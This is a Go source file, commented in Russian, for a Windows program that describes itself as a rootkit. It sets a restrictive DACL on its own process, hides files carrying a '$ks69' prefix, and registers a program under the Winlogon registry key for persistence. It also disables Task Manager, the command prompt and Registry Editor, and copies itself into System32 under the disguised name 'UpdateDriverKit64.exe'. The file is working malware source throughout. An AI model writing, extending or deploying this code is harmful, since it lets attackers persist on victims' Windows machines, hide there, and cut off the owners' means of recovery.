package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")

	procConvertStringSecurityDescriptorToSecurityDescriptor = modadvapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
	procLocalFree                                          = modkernel32.NewProc("LocalFree")
	procSetKernelObjectSecurity                            = modadvapi32.NewProc("SetKernelObjectSecurity")
)

const (
	SDDL_REVISION_1           = 1
	DACL_SECURITY_INFORMATION = 0x00000004
)

func enableSecurityPrivilege() error {
	var token windows.Token
	currentProcess, _ := windows.GetCurrentProcess()
	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, syscall.StringToUTF16Ptr("SeSecurityPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &privileges, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}

	return nil
}

func SelfDefense() bool {
	if err := enableSecurityPrivilege(); err != nil {
		fmt.Println("Failed to enable security privilege:", err)
		return false
	}

	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, windows.GetCurrentProcessId())
	if err != nil {
		fmt.Println("Error opening process:", err)
		return false
	}
	defer windows.CloseHandle(hProcess)

	szSD := "D:P(A;;GA;;;SY)(A;;GA;;;BA)(D;;GA;;;BG)(D;;GA;;;AN)"

	var securityDescriptor *windows.SECURITY_DESCRIPTOR
	ret, _, err := procConvertStringSecurityDescriptorToSecurityDescriptor.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(szSD))),
		uintptr(SDDL_REVISION_1),
		uintptr(unsafe.Pointer(&securityDescriptor)),
		uintptr(0),
	)
	if ret == 0 {
		fmt.Println("Error converting SDDL:", err)
		return false
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(securityDescriptor)))

	ret, _, err = procSetKernelObjectSecurity.Call(
		uintptr(hProcess),
		uintptr(DACL_SECURITY_INFORMATION),
		uintptr(unsafe.Pointer(securityDescriptor)),
	)
	if ret == 0 {
		fmt.Println("Error setting security:", err)
		return false
	}

	return true
}

func hideFile(filename string) error {
	path, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return fmt.Errorf("failed to convert filename to UTF-16: %v", err)
	}
	err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	if err != nil {
		return fmt.Errorf("failed to set Super Hidden attributes: %v", err)
	}
	return nil
}

func showFile(filename string) error {
	path, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return fmt.Errorf("failed to convert filename to UTF-16: %v", err)
	}
	err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_NORMAL)
	if err != nil {
		return fmt.Errorf("failed to set normal attributes: %v", err)
	}
	return nil
}

func addToWinlogon(programPath string) error {
	keyPath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	valueName := "TaskKS69"
	err = key.SetStringValue(valueName, programPath)
	if err != nil {
		return fmt.Errorf("failed to set value: %v", err)
	}

	fmt.Printf("Value '%s' successfully added to registry.\n", programPath)
	return nil
}

func removeFromWinlogon() error {
	keyPath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	valueName := "TaskKS69"
	err = key.DeleteValue(valueName)
	if err != nil {
		return fmt.Errorf("failed to delete value: %v", err)
	}

	fmt.Println("Value successfully deleted from registry.")
	return nil
}

// Отключение и включение Диспетчера задач
func disableTaskManager() error {
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		// Если ключ не существует, создаем его
		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
		if err != nil {
			return fmt.Errorf("failed to create registry key: %v", err)
		}
	}
	defer key.Close()

	// Устанавливаем значение DisableTaskMgr = 1
	err = key.SetDWordValue("DisableTaskMgr", 1)
	if err != nil {
		return fmt.Errorf("failed to set DisableTaskMgr value: %v", err)
	}

	fmt.Println("Task Manager disabled.")
	return nil
}

func enableTaskManager() error {
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	// Удаляем значение DisableTaskMgr
	err = key.DeleteValue("DisableTaskMgr")
	if err != nil {
		return fmt.Errorf("failed to delete DisableTaskMgr value: %v", err)
	}

	fmt.Println("Task Manager enabled.")
	return nil
}

// Отключение и включение Командной строки (CMD)
func disableCMD() error {
	keyPath := `SOFTWARE\Policies\Microsoft\Windows\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		// Если ключ не существует, создаем его
		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
		if err != nil {
			return fmt.Errorf("failed to create registry key: %v", err)
		}
	}
	defer key.Close()

	// Устанавливаем значение DisableCMD = 1
	err = key.SetDWordValue("DisableCMD", 1)
	if err != nil {
		return fmt.Errorf("failed to set DisableCMD value: %v", err)
	}

	fmt.Println("CMD disabled.")
	return nil
}

func enableCMD() error {
	keyPath := `SOFTWARE\Policies\Microsoft\Windows\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	// Удаляем значение DisableCMD
	err = key.DeleteValue("DisableCMD")
	if err != nil {
		return fmt.Errorf("failed to delete DisableCMD value: %v", err)
	}

	fmt.Println("CMD enabled.")
	return nil
}

// Отключение и включение Редактора реестра
func disableRegistryEditor() error {
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		// Если ключ не существует, создаем его
		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
		if err != nil {
			return fmt.Errorf("failed to create registry key: %v", err)
		}
	}
	defer key.Close()

	// Устанавливаем значение DisableRegistryTools = 1
	err = key.SetDWordValue("DisableRegistryTools", 1)
	if err != nil {
		return fmt.Errorf("failed to set DisableRegistryTools value: %v", err)
	}

	fmt.Println("Registry Editor disabled.")
	return nil
}

func enableRegistryEditor() error {
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	// Удаляем значение DisableRegistryTools
	err = key.DeleteValue("DisableRegistryTools")
	if err != nil {
		return fmt.Errorf("failed to delete DisableRegistryTools value: %v", err)
	}

	fmt.Println("Registry Editor enabled.")
	return nil
}

// Установка руткита в System32 с новым именем
func install() error {
	// Получаем путь к текущему исполняемому файлу
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// Путь назначения в System32 с новым именем
	targetPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "UpdateDriverKit64.exe")

	// Копируем файл
	err = copyFile(exePath, targetPath)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	fmt.Printf("Rootkit installed to: %s\n", targetPath)
	return nil
}

// Удаление руткита из System32
func uninstall() error {
	// Путь к файлу в System32
	targetPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "UpdateDriverKit64.exe")

	// Удаляем файл
	err := os.Remove(targetPath)
	if err != nil {
		return fmt.Errorf("failed to remove file: %v", err)
	}

	fmt.Printf("Rootkit removed from: %s\n", targetPath)
	return nil
}

// Копирование файла
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("failed to read source file: %v", err)
	}

	err = os.WriteFile(dst, input, 0644)
	if err != nil {
		return fmt.Errorf("failed to write destination file: %v", err)
	}

	return nil
}

func main() {
	if !SelfDefense() {
		fmt.Println("SelfDefense failed, but continuing execution...")
	}

	if len(os.Args) < 2 {
		fmt.Println("This rootkit hides files and folders with the '$ks69' prefix!")
		fmt.Println("Usage:")
		fmt.Println("  rootkit show/hide <path>")
		fmt.Println("  rootkit winlogon <programPath>")
		fmt.Println("  rootkit unwinlogon")
		fmt.Println("  rootkit disable/enable cmd/taskmgr/registry")
		fmt.Println("  rootkit install")
		fmt.Println("  rootkit uninstall")
		return
	}

	action := os.Args[1]

	switch action {
	case "show", "hide":
		if len(os.Args) != 3 {
			fmt.Println("Usage: rootkit <path> show/hide")
			return
		}

		rootDir := os.Args[2]

		err := filepath.WalkDir(rootDir, func(path string, dirEntry os.DirEntry, err error) error {
			if err != nil {
				fmt.Printf("Error accessing path %s: %v\n", path, err)
				return nil
			}

			if strings.HasPrefix(dirEntry.Name(), "$ks69") {
				fmt.Printf("Processing: %s\n", path)

				switch action {
				case "hide":
					if err := hideFile(path); err != nil {
						fmt.Printf("Failed to hide %s: %v\n", path, err)
					}
				case "show":
					if err := showFile(path); err != nil {
						fmt.Printf("Failed to show %s: %v\n", path, err)
					}
				}
			}

			return nil
		})

		if err != nil {
			fmt.Printf("Error walking the directory: %v\n", err)
		}

		fmt.Printf("Files and folders with prefix '$ks69' have been processed. Action: %s\n", action)

	case "winlogon":
		if len(os.Args) != 3 {
			fmt.Println("Usage: rootkit <programPath> winlogon")
			return
		}

		programPath := os.Args[2]
		if err := addToWinlogon(programPath); err != nil {
			log.Fatalf("Failed to add to Winlogon: %v", err)
		}

	case "unwinlogon":
		if len(os.Args) != 2 {
			fmt.Println("Usage: rootkit unwinlogon")
			return
		}

		if err := removeFromWinlogon(); err != nil {
			log.Fatalf("Failed to remove from Winlogon: %v", err)
		}

	case "disable", "enable":
		if len(os.Args) != 3 {
			fmt.Println("Usage: rootkit disable/enable cmd/taskmgr/registry")
			return
		}

		target := os.Args[2]
		switch target {
		case "cmd":
			if action == "disable" {
				if err := disableCMD(); err != nil {
					log.Fatalf("Failed to disable CMD: %v", err)
				}
			} else {
				if err := enableCMD(); err != nil {
					log.Fatalf("Failed to enable CMD: %v", err)
				}
			}
		case "taskmgr":
			if action == "disable" {
				if err := disableTaskManager(); err != nil {
					log.Fatalf("Failed to disable Task Manager: %v", err)
				}
			} else {
				if err := enableTaskManager(); err != nil {
					log.Fatalf("Failed to enable Task Manager: %v", err)
				}
			}
		case "registry":
			if action == "disable" {
				if err := disableRegistryEditor(); err != nil {
					log.Fatalf("Failed to disable Registry Editor: %v", err)
				}
			} else {
				if err := enableRegistryEditor(); err != nil {
					log.Fatalf("Failed to enable Registry Editor: %v", err)
				}
			}
		default:
			fmt.Println("Invalid target. Use 'cmd', 'taskmgr', or 'registry'.")
		}

	case "install":
		if err := install(); err != nil {
			log.Fatalf("Failed to install rootkit: %v", err)
		}

	case "uninstall":
		if err := uninstall(); err != nil {
			log.Fatalf("Failed to uninstall rootkit: %v", err)
		}

	default:
		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', 'unwinlogon', 'disable', 'enable', 'install', or 'uninstall'.")
	}
}